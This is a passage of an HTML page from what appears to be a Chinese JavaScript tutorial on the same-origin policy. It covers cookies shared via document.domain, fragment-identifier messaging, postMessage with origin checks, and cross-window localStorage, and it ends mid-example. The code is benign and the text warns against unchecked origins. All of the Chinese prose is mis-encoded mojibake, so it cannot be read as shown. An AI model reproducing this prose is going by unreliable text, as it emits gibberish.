<li><code>http://www.example.com:81/dir/other.html</code>ï¼šä¸åŒæºï¼ˆç«¯å£ä¸åŒï¼‰</li> <li><code>https://www.example.com/dir/page.html</code>ï¼šä¸åŒæºï¼ˆåè®®ä¸åŒï¼‰</li></ul> <p>æ³¨æ„ï¼Œæ ‡å‡†è§„å®šç«¯å£ä¸åŒçš„ç½‘å€ä¸æ˜¯åŒæºï¼ˆæ¯”å¦‚8000ç«¯å£å’Œ8001ç«¯å£ä¸æ˜¯åŒæºï¼‰ï¼Œä½†æ˜¯æµè§ˆå™¨æ²¡æœ‰éµå®ˆè¿™æ¡è§„å®šã€‚å®é™…ä¸Šï¼ŒåŒä¸€ä¸ªç½‘åŸŸçš„ä¸åŒç«¯å£ï¼Œæ˜¯å¯ä»¥äº’ç›¸è¯»å– Cookie çš„ã€‚</p> <h3 id="ç›®çš„"><a href="#ç›®çš„" class="header-anchor">#</a> ç›®çš„</h3> <p>åŒæºæ”¿ç­–çš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†ä¿è¯ç”¨æˆ·ä¿¡æ¯çš„å®‰å…¨ï¼Œé˜²æ­¢æ¶æ„çš„ç½‘ç«™çªƒå–æ•°æ®ã€‚</p> <p>è®¾æƒ³è¿™æ ·ä¸€ç§æƒ…å†µï¼šA ç½‘ç«™æ˜¯ä¸€å®¶é“¶è¡Œï¼Œç”¨æˆ·ç™»å½•ä»¥åï¼ŒA ç½‘ç«™åœ¨ç”¨æˆ·çš„æœºå™¨ä¸Šè®¾ç½®äº†ä¸€ä¸ª Cookieï¼ŒåŒ…å«äº†ä¸€äº›éšç§ä¿¡æ¯ã€‚ç”¨æˆ·ç¦»å¼€ A ç½‘ç«™ä»¥åï¼Œåˆå»è®¿é—® B ç½‘ç«™ï¼Œå¦‚æœæ²¡æœ‰åŒæºé™åˆ¶ï¼ŒB ç½‘ç«™å¯ä»¥è¯»å– A ç½‘ç«™çš„ Cookieï¼Œé‚£ä¹ˆéšç§å°±æ³„æ¼äº†ã€‚æ›´å¯æ€•çš„æ˜¯ï¼ŒCookie å¾€å¾€ç”¨æ¥ä¿å­˜ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰é€€å‡ºç™»å½•ï¼Œå…¶ä»–ç½‘ç«™å°±å¯ä»¥å†’å……ç”¨æˆ·ï¼Œä¸ºæ‰€æ¬²ä¸ºã€‚å› ä¸ºæµè§ˆå™¨åŒæ—¶è¿˜è§„å®šï¼Œæäº¤è¡¨å•ä¸å—åŒæºæ”¿ç­–çš„é™åˆ¶ã€‚</p> <p>ç”±æ­¤å¯è§ï¼ŒåŒæºæ”¿ç­–æ˜¯å¿…éœ€çš„ï¼Œå¦åˆ™ Cookie å¯ä»¥å…±äº«ï¼Œäº’è”ç½‘å°±æ¯«æ— å®‰å…¨å¯è¨€äº†ã€‚</p> <h3 id="é™åˆ¶èŒƒå›´"><a href="#é™åˆ¶èŒƒå›´" class="header-anchor">#</a> é™åˆ¶èŒƒå›´</h3> <p>éšç€äº’è”ç½‘çš„å‘å±•ï¼ŒåŒæºæ”¿ç­–è¶Šæ¥è¶Šä¸¥æ ¼ã€‚ç›®å‰ï¼Œå¦‚æœéåŒæºï¼Œå…±æœ‰ä¸‰ç§è¡Œä¸ºå—åˆ°é™åˆ¶ã€‚</p> <blockquote><p>ï¼ˆ1ï¼‰ æ— æ³•è¯»å–éåŒæºç½‘é¡µçš„ Cookieã€LocalStorage å’Œ IndexedDBã€‚</p> <p>ï¼ˆ2ï¼‰ æ— æ³•æ¥è§¦éåŒæºç½‘é¡µçš„ DOMã€‚</p> <p>ï¼ˆ3ï¼‰ æ— æ³•å‘éåŒæºåœ°å€å‘é€ AJAX è¯·æ±‚ï¼ˆå¯ä»¥å‘é€ï¼Œä½†æµè§ˆå™¨ä¼šæ‹’ç»æ¥å—å“åº”ï¼‰ã€‚</p></blockquote> <p>å¦å¤–ï¼Œé€šè¿‡ JavaScript è„šæœ¬å¯ä»¥æ‹¿åˆ°å…¶ä»–çª—å£çš„<code>window</code>å¯¹è±¡ã€‚å¦‚æœæ˜¯éåŒæºçš„ç½‘é¡µï¼Œç›®å‰å…è®¸ä¸€ä¸ªçª—å£å¯ä»¥æ¥è§¦å…¶ä»–ç½‘é¡µçš„<code>window</code>å¯¹è±¡çš„ä¹ä¸ªå±æ€§å’Œå››ä¸ªæ–¹æ³•ã€‚</p> <ul><li>window.closed</li> <li>window.frames</li> <li>window.length</li> <li>window.location</li> <li>window.opener</li> <li>window.parent</li> <li>window.self</li> <li>window.top</li> <li>window.window</li> <li>window.blur()</li> <li>window.close()</li> <li>window.focus()</li> <li>window.postMessage()</li></ul> <p>ä¸Šé¢çš„ä¹ä¸ªå±æ€§ä¹‹ä¸­ï¼Œåªæœ‰<code>window.location</code>æ˜¯å¯è¯»å†™çš„ï¼Œå…¶ä»–å…«ä¸ªå…¨éƒ¨éƒ½æ˜¯åªè¯»ã€‚è€Œä¸”ï¼Œå³ä½¿æ˜¯<code>location</code>å¯¹è±¡ï¼ŒéåŒæºçš„æƒ…å†µä¸‹ï¼Œä¹Ÿåªå…è®¸è°ƒç”¨<code>location.replace()</code>æ–¹æ³•å’Œå†™å…¥<code>location.href</code>å±æ€§ã€‚</p> <p>è™½ç„¶è¿™äº›é™åˆ¶æ˜¯å¿…è¦çš„ï¼Œä½†æ˜¯æœ‰æ—¶å¾ˆä¸æ–¹ä¾¿ï¼Œåˆç†çš„ç”¨é€”ä¹Ÿå—åˆ°å½±å“ã€‚ä¸‹é¢ä»‹ç»å¦‚ä½•è§„é¿ä¸Šé¢çš„é™åˆ¶ã€‚</p> <h2 id="_2-cookie"><a href="#_2-cookie" class="header-anchor">#</a> 2.Cookie</h2> <p>Cookie æ˜¯æœåŠ¡å™¨å†™å…¥æµè§ˆå™¨çš„ä¸€å°æ®µä¿¡æ¯ï¼Œåªæœ‰åŒæºçš„ç½‘é¡µæ‰èƒ½å…±äº«ã€‚å¦‚æœä¸¤ä¸ªç½‘é¡µä¸€çº§åŸŸåç›¸åŒï¼Œåªæ˜¯æ¬¡çº§åŸŸåä¸åŒï¼Œæµè§ˆå™¨å…è®¸é€šè¿‡è®¾ç½®<code>document.domain</code>å…±äº« Cookieã€‚</p> <p>ä¸¾ä¾‹æ¥è¯´ï¼ŒA ç½‘é¡µçš„ç½‘å€æ˜¯<code>http://w1.example.com/a.html</code>ï¼ŒB ç½‘é¡µçš„ç½‘å€æ˜¯<code>http://w2.example.com/b.html</code>ï¼Œé‚£ä¹ˆåªè¦è®¾ç½®ç›¸åŒçš„<code>document.domain</code>ï¼Œä¸¤ä¸ªç½‘é¡µå°±å¯ä»¥å…±äº« Cookieã€‚å› ä¸ºæµè§ˆå™¨é€šè¿‡<code>document.domain</code>å±æ€§æ¥æ£€æŸ¥æ˜¯å¦åŒæºã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// ä¸¤ä¸ªç½‘é¡µéƒ½éœ€è¦è®¾ç½®</span>
document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">'example.com'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æ³¨æ„ï¼ŒA å’Œ B ä¸¤ä¸ªç½‘é¡µéƒ½éœ€è¦è®¾ç½®<code>document.domain</code>å±æ€§ï¼Œæ‰èƒ½è¾¾åˆ°åŒæºçš„ç›®çš„ã€‚å› ä¸ºè®¾ç½®<code>document.domain</code>çš„åŒæ—¶ï¼Œä¼šæŠŠç«¯å£é‡ç½®ä¸º<code>null</code>ï¼Œå› æ­¤å¦‚æœåªè®¾ç½®ä¸€ä¸ªç½‘é¡µçš„<code>document.domain</code>ï¼Œä¼šå¯¼è‡´ä¸¤ä¸ªç½‘å€çš„ç«¯å£ä¸åŒï¼Œè¿˜æ˜¯è¾¾ä¸åˆ°åŒæºçš„ç›®çš„ã€‚</p> <p>ç°åœ¨ï¼ŒA ç½‘é¡µé€šè¿‡è„šæœ¬è®¾ç½®ä¸€ä¸ª Cookieã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">&quot;test1=hello&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>B ç½‘é¡µå°±å¯ä»¥è¯»åˆ°è¿™ä¸ª Cookieã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> allCookie <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ³¨æ„ï¼Œè¿™ç§æ–¹æ³•åªé€‚ç”¨äº Cookie å’Œ iframe çª—å£ï¼ŒLocalStorage å’Œ IndexedDB æ— æ³•é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œè§„é¿åŒæºæ”¿ç­–ï¼Œè€Œè¦ä½¿ç”¨ä¸‹æ–‡ä»‹ç» PostMessage APIã€‚</p> <p>å¦å¤–ï¼ŒæœåŠ¡å™¨ä¹Ÿå¯ä»¥åœ¨è®¾ç½® Cookie çš„æ—¶å€™ï¼ŒæŒ‡å®š Cookie çš„æ‰€å±åŸŸåä¸ºä¸€çº§åŸŸåï¼Œæ¯”å¦‚<code>.example.com</code>ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> key=value; domain=.example.com; path=/
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>è¿™æ ·çš„è¯ï¼ŒäºŒçº§åŸŸåå’Œä¸‰çº§åŸŸåä¸ç”¨åšä»»ä½•è®¾ç½®ï¼Œéƒ½å¯ä»¥è¯»å–è¿™ä¸ª Cookieã€‚</p> <h2 id="_3-iframe-å’Œå¤šçª—å£é€šä¿¡"><a href="#_3-iframe-å’Œå¤šçª—å£é€šä¿¡" class="header-anchor">#</a> 3.iframe å’Œå¤šçª—å£é€šä¿¡</h2> <p><code>iframe</code>å…ƒç´ å¯ä»¥åœ¨å½“å‰ç½‘é¡µä¹‹ä¸­ï¼ŒåµŒå…¥å…¶ä»–ç½‘é¡µã€‚æ¯ä¸ª<code>iframe</code>å…ƒç´ å½¢æˆè‡ªå·±çš„çª—å£ï¼Œå³æœ‰è‡ªå·±çš„<code>window</code>å¯¹è±¡ã€‚<code>iframe</code>çª—å£ä¹‹ä¸­çš„è„šæœ¬ï¼Œå¯ä»¥è·å¾—çˆ¶çª—å£å’Œå­çª—å£ã€‚ä½†æ˜¯ï¼Œåªæœ‰åœ¨åŒæºçš„æƒ…å†µä¸‹ï¼Œçˆ¶çª—å£å’Œå­çª—å£æ‰èƒ½é€šä¿¡ï¼›å¦‚æœè·¨åŸŸï¼Œå°±æ— æ³•æ‹¿åˆ°å¯¹æ–¹çš„ DOMã€‚</p> <p>æ¯”å¦‚ï¼Œçˆ¶çª—å£è¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå¦‚æœ<code>iframe</code>çª—å£ä¸æ˜¯åŒæºï¼Œå°±ä¼šæŠ¥é”™ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document
<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;myIFrame&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span>contentWindow
<span class="token punctuation">.</span>document
<span class="token comment">// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>ä¸Šé¢å‘½ä»¤ä¸­ï¼Œçˆ¶çª—å£æƒ³è·å–å­çª—å£çš„ DOMï¼Œå› ä¸ºè·¨åŸŸå¯¼è‡´æŠ¥é”™ã€‚</p> <p>åä¹‹äº¦ç„¶ï¼Œå­çª—å£è·å–ä¸»çª—å£çš„ DOM ä¹Ÿä¼šæŠ¥é”™ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>document<span class="token punctuation">.</span>body
<span class="token comment">// æŠ¥é”™</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¿™ç§æƒ…å†µä¸ä»…é€‚ç”¨äº<code>iframe</code>çª—å£ï¼Œè¿˜é€‚ç”¨äº<code>window.open</code>æ–¹æ³•æ‰“å¼€çš„çª—å£ï¼Œåªè¦è·¨åŸŸï¼Œçˆ¶çª—å£ä¸å­çª—å£ä¹‹é—´å°±æ— æ³•é€šä¿¡ã€‚</p> <p>å¦‚æœä¸¤ä¸ªçª—å£ä¸€çº§åŸŸåç›¸åŒï¼Œåªæ˜¯äºŒçº§åŸŸåä¸åŒï¼Œé‚£ä¹ˆè®¾ç½®ä¸Šä¸€èŠ‚ä»‹ç»çš„<code>document.domain</code>å±æ€§ï¼Œå°±å¯ä»¥è§„é¿åŒæºæ”¿ç­–ï¼Œæ‹¿åˆ° DOMã€‚</p> <p>å¯¹äºå®Œå…¨ä¸åŒæºçš„ç½‘ç«™ï¼Œç›®å‰æœ‰ä¸¤ç§æ–¹æ³•ï¼Œå¯ä»¥è§£å†³è·¨åŸŸçª—å£çš„é€šä¿¡é—®é¢˜ã€‚</p> <blockquote><ul><li>ç‰‡æ®µè¯†åˆ«ç¬¦ï¼ˆfragment identifierï¼‰</li> <li>è·¨æ–‡æ¡£é€šä¿¡APIï¼ˆCross-document messagingï¼‰</li></ul></blockquote> <h3 id="ç‰‡æ®µè¯†åˆ«ç¬¦"><a href="#ç‰‡æ®µè¯†åˆ«ç¬¦" class="header-anchor">#</a> ç‰‡æ®µè¯†åˆ«ç¬¦</h3> <p>ç‰‡æ®µæ ‡è¯†ç¬¦ï¼ˆfragment identifierï¼‰æŒ‡çš„æ˜¯ï¼ŒURL çš„<code>#</code>å·åé¢çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚<code>http://example.com/x.html#fragment</code>çš„<code>#fragment</code>ã€‚å¦‚æœåªæ˜¯æ”¹å˜ç‰‡æ®µæ ‡è¯†ç¬¦ï¼Œé¡µé¢ä¸ä¼šé‡æ–°åˆ·æ–°ã€‚</p> <p>çˆ¶çª—å£å¯ä»¥æŠŠä¿¡æ¯ï¼Œå†™å…¥å­çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> src <span class="token operator">=</span> originURL <span class="token operator">+</span> <span class="token string">'#'</span> <span class="token operator">+</span> data<span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'myIFrame'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œçˆ¶çª—å£æŠŠæ‰€è¦ä¼ é€’çš„ä¿¡æ¯ï¼Œå†™å…¥ iframe çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚</p> <p>å­çª—å£é€šè¿‡ç›‘å¬<code>hashchange</code>äº‹ä»¶å¾—åˆ°é€šçŸ¥ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>onhashchange <span class="token operator">=</span> checkMessage<span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">checkMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> message <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>åŒæ ·çš„ï¼Œå­çª—å£ä¹Ÿå¯ä»¥æ”¹å˜çˆ¶çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>parent<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">'#'</span> <span class="token operator">+</span> hash<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="window-postmessage"><a href="#window-postmessage" class="header-anchor">#</a> window.postMessage()</h3> <p>ä¸Šé¢çš„è¿™ç§æ–¹æ³•å±äºç ´è§£ï¼ŒHTML5 ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¼•å…¥äº†ä¸€ä¸ªå…¨æ–°çš„APIï¼šè·¨æ–‡æ¡£é€šä¿¡ APIï¼ˆCross-document messagingï¼‰ã€‚</p> <p>è¿™ä¸ª API ä¸º<code>window</code>å¯¹è±¡æ–°å¢äº†ä¸€ä¸ª<code>window.postMessage</code>æ–¹æ³•ï¼Œå…è®¸è·¨çª—å£é€šä¿¡ï¼Œä¸è®ºè¿™ä¸¤ä¸ªçª—å£æ˜¯å¦åŒæºã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œçˆ¶çª—å£<code>aaa.com</code>å‘å­çª—å£<code>bbb.com</code>å‘æ¶ˆæ¯ï¼Œè°ƒç”¨<code>postMessage</code>æ–¹æ³•å°±å¯ä»¥äº†ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// çˆ¶çª—å£æ‰“å¼€ä¸€ä¸ªå­çª—å£</span>
<span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://bbb.com'</span><span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// çˆ¶çª—å£å‘å­çª—å£å‘æ¶ˆæ¯</span>
popup<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Hello World!'</span><span class="token punctuation">,</span> <span class="token string">'http://bbb.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><code>postMessage</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å…·ä½“çš„ä¿¡æ¯å†…å®¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ¥æ”¶æ¶ˆæ¯çš„çª—å£çš„æºï¼ˆoriginï¼‰ï¼Œå³â€œåè®® + åŸŸå + ç«¯å£â€ã€‚ä¹Ÿå¯ä»¥è®¾ä¸º<code>*</code>ï¼Œè¡¨ç¤ºä¸é™åˆ¶åŸŸåï¼Œå‘æ‰€æœ‰çª—å£å‘é€ã€‚</p> <p>å­çª—å£å‘çˆ¶çª—å£å‘é€æ¶ˆæ¯çš„å†™æ³•ç±»ä¼¼ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// å­çª—å£å‘çˆ¶çª—å£å‘æ¶ˆæ¯</span>
window<span class="token punctuation">.</span>opener<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Nice to see you'</span><span class="token punctuation">,</span> <span class="token string">'http://aaa.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>çˆ¶çª—å£å’Œå­çª—å£éƒ½å¯ä»¥é€šè¿‡<code>message</code>äº‹ä»¶ï¼Œç›‘å¬å¯¹æ–¹çš„æ¶ˆæ¯ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// çˆ¶çª—å£å’Œå­çª—å£éƒ½å¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç ï¼Œ</span>
<span class="token comment">// ç›‘å¬ message æ¶ˆæ¯</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><code>message</code>äº‹ä»¶çš„å‚æ•°æ˜¯äº‹ä»¶å¯¹è±¡<code>event</code>ï¼Œæä¾›ä»¥ä¸‹ä¸‰ä¸ªå±æ€§ã€‚</p> <blockquote><ul><li><code>event.source</code>ï¼šå‘é€æ¶ˆæ¯çš„çª—å£</li> <li><code>event.origin</code>: æ¶ˆæ¯å‘å‘çš„ç½‘å€</li> <li><code>event.data</code>: æ¶ˆæ¯å†…å®¹</li></ul></blockquote> <p>ä¸‹é¢çš„ä¾‹å­æ˜¯ï¼Œå­çª—å£é€šè¿‡<code>event.source</code>å±æ€§å¼•ç”¨çˆ¶çª—å£ï¼Œç„¶åå‘é€æ¶ˆæ¯ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> receiveMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">receiveMessage</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  event<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Nice to see you!'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç æœ‰å‡ ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ã€‚é¦–å…ˆï¼Œ<code>receiveMessage</code>å‡½æ•°é‡Œé¢æ²¡æœ‰è¿‡æ»¤ä¿¡æ¯çš„æ¥æºï¼Œä»»æ„ç½‘å€å‘æ¥çš„ä¿¡æ¯éƒ½ä¼šè¢«å¤„ç†ã€‚å…¶æ¬¡ï¼Œ<code>postMessage</code>æ–¹æ³•ä¸­æŒ‡å®šçš„ç›®æ ‡çª—å£çš„ç½‘å€æ˜¯ä¸€ä¸ªæ˜Ÿå·ï¼Œè¡¨ç¤ºè¯¥ä¿¡æ¯å¯ä»¥å‘ä»»æ„ç½‘å€å‘é€ã€‚é€šå¸¸æ¥è¯´ï¼Œè¿™ä¸¤ç§åšæ³•æ˜¯ä¸æ¨èçš„ï¼Œå› ä¸ºä¸å¤Ÿå®‰å…¨ï¼Œå¯èƒ½ä¼šè¢«æ¶æ„åˆ©ç”¨ã€‚</p> <p><code>event.origin</code>å±æ€§å¯ä»¥è¿‡æ»¤ä¸æ˜¯å‘ç»™æœ¬çª—å£çš„æ¶ˆæ¯ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> receiveMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">receiveMessage</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token string">'http://aaa.com'</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>data <span class="token operator">===</span> <span class="token string">'Hello World'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="localstorage"><a href="#localstorage" class="header-anchor">#</a> LocalStorage</h3> <p>é€šè¿‡<code>window.postMessage</code>ï¼Œè¯»å†™å…¶ä»–çª—å£çš„ LocalStorage ä¹Ÿæˆä¸ºäº†å¯èƒ½ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œä¸»çª—å£å†™å…¥ iframe å­çª—å£çš„<code>localStorage</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token string">'http://bbb.com'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>key<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå­çª—å£å°†çˆ¶çª—å£å‘æ¥çš„æ¶ˆæ¯ï¼Œå†™å…¥è‡ªå·±çš„ LocalStorageã€‚</p> <p>çˆ¶çª—å£å‘é€æ¶ˆæ¯çš„ä»£ç å¦‚ä¸‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> win <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>
<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'Jack'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
win<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>key<span class="token operator">:</span> <span class="token string">'storage'</span><span class="token punctuation">,</span> data<span class="token operator">:</span> obj<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token string">'http://bbb.com'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
